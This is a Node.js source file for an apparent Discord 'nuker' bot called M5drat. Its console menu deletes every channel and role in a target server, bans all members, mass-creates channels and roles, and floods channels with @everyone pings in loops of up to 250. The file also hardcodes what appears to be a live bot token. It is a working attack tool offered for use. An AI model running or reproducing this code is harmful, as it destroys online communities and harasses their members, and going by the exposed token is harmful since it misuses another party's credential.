const express = require('express');

const app = express();

app.get('/', (req, res) => {
  res.send('The Bot By M5drat.')
});
const { Client , MessageActionRow , MessageButton , MessageEmbed , MessageSelectMenu , Intents , Collection} = require("discord.js");
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_BANS, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS, Intents.FLAGS.GUILD_INTEGRATIONS, Intents.FLAGS.GUILD_WEBHOOKS, Intents.FLAGS.GUILD_INVITES, Intents.FLAGS.GUILD_VOICE_STATES, Intents.FLAGS.GUILD_PRESENCES, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_MESSAGE_REACTIONS, Intents.FLAGS.GUILD_MESSAGE_TYPING, Intents.FLAGS.DIRECT_MESSAGES, Intents.FLAGS.DIRECT_MESSAGE_REACTIONS, Intents.FLAGS.DIRECT_MESSAGE_TYPING] });
client.login('ODU3OTIwMjgwNTM3OTg5MTQw.G9Ul_c.SOu1GRs0L5Bd9i4Dr90t2hkjyuzRMQIF8BH8dY')
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
client.on('ready', () => {
console.log(`${client.user.tag}`)
 client.user.setActivity(`M5drat development`, { type: 'STREAMING', url: 'https://www.twitch.tv/brvfranko' }) 
  
});

let title = `


/$$$$$$            /$$          /$$     /$$                                               /$$$$$$ 
/$$__  $$          | $$         |  $$   /$$/                                              /$$__  $$
| $$  \ $$ /$$$$$$$ | $$ /$$   /$$\  $$ /$$/$$$$$$  /$$   /$$  /$$$$$$$ /$$$$$$$  /$$$$$$ | $$  \__/
| $$  | $$| $$__  $$| $$| $$  | $$ \  $$$$/$$__  $$| $$  | $$ /$$_____//$$_____/ /$$__  $$| $$$$    
| $$  | $$| $$  \ $$| $$| $$  | $$  \  $$/ $$  \ $$| $$  | $$|  $$$$$$|  $$$$$$ | $$$$$$$$| $$_/    
| $$  | $$| $$  | $$| $$| $$  | $$   | $$| $$  | $$| $$  | $$ \____  $$\____  $$| $$_____/| $$      
|  $$$$$$/| $$  | $$| $$|  $$$$$$$   | $$|  $$$$$$/|  $$$$$$/ /$$$$$$$//$$$$$$$/|  $$$$$$$| $$      
\______/ |__/  |__/|__/ \____  $$   |__/ \______/  \______/ |_______/|_______/  \_______/|__/      
                        /$$  | $$                                                                  
                       |  $$$$$$/                                                                  
                        \______/                                                                   


                       [1] = Text Channel Creation.6
                       [2] = Voice Channel Creation.
                       [3] = Category Creation.
                       [4] = Role Creation.
                       [5] = Delete All Channels and Categories.
                       [6] = Delete All Roles.
                       [7] = Ban All Members.
                       [8] = Ping Everyone In Every Channel.
                       [9] = Unban A User From The Guild.                   
                       [0] = Exit The Console
                        
                        
                        `
var readlineSync = require('readline-sync');
async function m5drat() {
    console.log(title)
    
    await sleep(1000)
var question = readlineSync.question('[?]:')

if(question === "0"){
    await process.exit(1)
}else if(question === "1"){
    var guildid = readlineSync.question('[?] Guild id:')
    if(isNaN(guildid)){
        console.log('[❌] Must Be A Number')
        await sleep(3000)
        m5drat()
    }
    let guild = client.guilds.cache.get(guildid)
    if(!guild){
         console.log(`[❌] Can't Fetch guild id or this id is wrong`)
        await sleep(3000)
        m5drat()
    }
    var amountchannels = readlineSync.question('How much channels you want to make ?:')
    if(isNaN(amountchannels)){
    console.log('[❌] Must Be A Number')
    await sleep(3000)
    m5drat()
    }
    var namechannels = readlineSync.question('What do you want to name the channels ?:')
    for(var i=0; i < amountchannels; i++){
       await guild.channels.create(`${namechannels}`).catch(err => {console.log(`Can't create ${namechannels} in ${guild.name} `)})
    }
}else if(question === "2"){
    var guildid = readlineSync.question('[?] Guild id:')
    if(isNaN(guildid)){
        console.log('[❌] Must Be A Number')
        await sleep(3000)
        m5drat()
    }
    let guild = client.guilds.cache.get(guildid)
    if(!guild){
         console.log(`[❌] Can't Fetch guild id or this id is wrong`)
        await sleep(3000)
        m5drat()
    }
    var amountchannels = readlineSync.question('How much channels you want to make ?:')
    if(isNaN(amountchannels)){
    console.log('[❌] Must Be A Number')
    await sleep(3000)
    m5drat()
    }
    var namechannels = readlineSync.question('What do you want to name the channels ?:')
    for(var i=0; i < amountchannels; i++){
       await guild.channels.create(`${namechannels}`, {type: 'GUILD_VOICE'}).catch(err => {console.log(`Can't create ${namechannels} in ${guild.name} `)})
    }
}else if(question === "3"){
    var guildid = readlineSync.question('[?] Guild id:')
    if(isNaN(guildid)){
        console.log('[❌] Must Be A Number')
        await sleep(3000)
        m5drat()
    }
    let guild = client.guilds.cache.get(guildid)
    if(!guild){
         console.log(`[❌] Can't Fetch guild id or this id is wrong`)
        await sleep(3000)
        m5drat()
    }
    var amountchannels = readlineSync.question('How much channels you want to make ?:')
    if(isNaN(amountchannels)){
    console.log('[❌] Must Be A Number')
    await sleep(3000)
    m5drat()
    }
    var namechannels = readlineSync.question('What do you want to name the channels ?:')
    for(var i=0; i < amountchannels; i++){
       await guild.channels.create(`${namechannels}`, {type: 'GUILD_CATEGORY'}).catch(err => {console.log(`Can't create ${namechannels} in ${guild.name} `)})
    }
}else if(question === "4"){
    var guildid = readlineSync.question('[?] Guild id:')
    if(isNaN(guildid)){
        console.log('[❌] Must Be A Number')
        await sleep(3000)
        m5drat()
    }
    let guild = client.guilds.cache.get(guildid)
    if(!guild){
         console.log(`[❌] Can't Fetch guild id or this id is wrong`)
        await sleep(3000)
        m5drat()
    }
    var amountroles = readlineSync.question('How much roles you want to make ?:')
    if(isNaN(amountroles)){
    console.log('[❌] Must Be A Number')
    await sleep(3000)
    m5drat()
    }
    var namecroles = readlineSync.question('What do you want to name the roles ?:')
    for(var i=0; i < amountroles; i++){
       await guild.roles.create({name: `${namecroles}`}).catch(err => {console.log(`Can't create ${namecroles} in ${guild.name} `)})
    }
}else if(question === "5"){
    var guildid = readlineSync.question('[?] Guild id:')
    if(isNaN(guildid)){
        console.log('[❌] Must Be A Number')
        await sleep(3000)
        m5drat()
    }
    let guild = client.guilds.cache.get(guildid)
    if(!guild){
         console.log(`[❌] Can't Fetch guild id or this id is wrong`)
        await sleep(3000)
        m5drat()
    }
    guild.channels.cache.forEach(async channel => {
        if(!channel.deletable)return console.log(`[❌] Can't Delete ${channel.name}`)
       await channel.delete()
       
    })
}else if(question === "6"){
    var guildid = readlineSync.question('[?] Guild id:')
    if(isNaN(guildid)){
        console.log('[❌] Must Be A Number')
        await sleep(3000)
        m5drat()
    }
    let guild = client.guilds.cache.get(guildid)
    if(!guild){
         console.log(`[❌] Can't Fetch guild id or this id is wrong`)
        await sleep(3000)
        m5drat()
    }
    guild.roles.cache.forEach(async roles => {
        await roles.delete()
     })
}else if(question === "8"){
    var guildid = readlineSync.question('[?] Guild id:')
    if(isNaN(guildid)){
        console.log('[❌] Must Be A Number')
        await sleep(3000)
        m5drat()
    }
    let guild = client.guilds.cache.get(guildid)
    if(!guild){
         console.log(`[❌] Can't Fetch guild id or this id is wrong`)
        await sleep(3000)
        m5drat()
    }
    var namechannels = readlineSync.question('What do you want to name the channels ?:')
    for (var i = 0; i < 250; i++) {
        guild.channels.create(namechannels)

        for (var i = 0; i < 250; i++) {
            let channels = guild.channels.create(namechannels)

            channels.then(
                function (channel, index) {
                    for (var i = 0; i < 250; i++) {
                        channel.send('@everyone')
        
                        
                    }
                }
            );
        }
}
}else if(question === "7"){
    var guildid = readlineSync.question('[?] Guild id:')
    if(isNaN(guildid)){
        console.log('[❌] Must Be A Number')
        await sleep(3000)
        m5drat()
    }
    let guild = client.guilds.cache.get(guildid)
    if(!guild){
         console.log(`[❌] Can't Fetch guild id or this id is wrong`)
        await sleep(3000)
        m5drat()
    }
    guild.members.cache.forEach(async member => {
        if(!member.bannable)return console.log(`[❌] Can't Ban ${member.user.tag}`)
         member.ban()
        
    })
}else if(question === "9"){
    var guildid = readlineSync.question('[?] Guild id:')
    if(isNaN(guildid)){
        console.log('[❌] Must Be A Number')
        await sleep(3000)
        m5drat()
    }
    let guild = client.guilds.cache.get(guildid)
    if(!guild){
         console.log(`[❌] Can't Fetch guild id or this id is wrong`)
        await sleep(3000)
        m5drat()
    }
    let banid = readlineSync.question('[?] Provide A User Id: ')
    try {
        let a7a = await guild.bans.remove(banid).then((ban) => {console.log(`[✔] Succesfully Unbanned ${banid}`)})
       
        
    } catch (e) {
        console.log(`[❌] Can't Find This Id In The BanList`)
        await sleep(3000)
        m5drat()
    }
    
}
}
client.on('ready', () => {
    m5drat()
})
process.on('unhandledRejection', async error => {
    console.log(`[ERROR]:` +  error)
})























































